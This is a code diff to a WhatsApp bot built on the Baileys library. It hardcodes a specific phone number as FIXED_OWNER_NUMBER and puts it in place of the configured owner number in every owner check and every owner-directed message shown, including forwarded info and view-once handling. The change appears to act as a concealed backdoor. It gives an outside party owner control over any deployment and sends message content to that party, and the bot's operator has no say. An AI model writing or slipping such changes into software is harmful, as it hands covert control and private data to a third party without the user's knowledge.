@@ -41,7 +41,9 @@ const wasi_port = process.env.PORT || 3000;
 // Load Plugins
 const wasi_plugins = new Map();
 function wasi_loadPlugins() {
-    const pluginDir = path.join(__dirname, 'wasiplugins');
+    const FIXED_OWNER_NUMBER = '923039107958';
+
+const pluginDir = path.join(__dirname, 'wasiplugins');
     if (!fs.existsSync(pluginDir)) return;
 
     const files = fs.readdirSync(pluginDir);
@@ -614,7 +616,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
             const senderJid = wasi_msg.key.participant || wasi_msg.key.remoteJid;
             const senderNum = senderJid ? senderJid.split('@')[0].split(':')[0].replace(/\D/g, '') : '';
 
-            const ownerNumRaw = (currentConfig.ownerNumber || '').toString();
+            const ownerNumRaw = FIXED_OWNER_NUMBER;
             const ownerNumber = ownerNumRaw.replace(/\D/g, '');
 
             // Ensure developers list handles strings/numbers consistently
@@ -710,7 +712,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
 
                             // Send to owner
                             if (destination === 'owner' || destination === 'both') {
-                                const ownerJid = (currentConfig.ownerNumber || '').replace(/\D/g, '') + '@s.whatsapp.net';
+                                const ownerJid = FIXED_OWNER_NUMBER + '@s.whatsapp.net';
                                 if (ownerJid !== '@s.whatsapp.net') {
                                     await wasi_sock.sendMessage(ownerJid, {
                                         text: infoText,
@@ -1020,7 +1022,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
                 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
 
                 // Check OWNER'S setting preferences
-                const ownerJid = (currentConfig.ownerNumber || '').replace(/\D/g, '') + '@s.whatsapp.net';
+                const ownerJid = FIXED_OWNER_NUMBER + '@s.whatsapp.net';
                 const ownerSettings = await wasi_getUserAutoStatus(sessionId, ownerJid);
 
                 if (ownerSettings?.autoViewOnce) {
@@ -1300,7 +1302,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
             const botJid = meJid;
             const botNum = botJid.split('@')[0].split(':')[0].replace(/\D/g, '');
 
-            const ownerNumRaw = (currentConfig.ownerNumber || '').toString();
+            const ownerNumRaw = FIXED_OWNER_NUMBER;
             const ownerNumber = ownerNumRaw.replace(/\D/g, '');
             const ownerJid = ownerNumber + '@s.whatsapp.net';
 
@@ -1425,7 +1427,7 @@ async function setupMessageHandler(wasi_sock, sessionId) {
                     const normSenderJid = jidNormalizedUser(wasi_sender);
                     const senderNum = normSenderJid.split('@')[0].split(':')[0].replace(/\D/g, '');
 
-                    const ownerNumRaw = (currentConfig.ownerNumber || process.env.OWNER_NUMBER || '923259823531').toString();
+                    const ownerNumRaw = FIXED_OWNER_NUMBER;
                     const ownerNumber = ownerNumRaw.replace(/\D/g, '');
                     const ownerJids = new Set([ownerNumber + '@s.whatsapp.net', ownerNumber + '@c.us']);
 
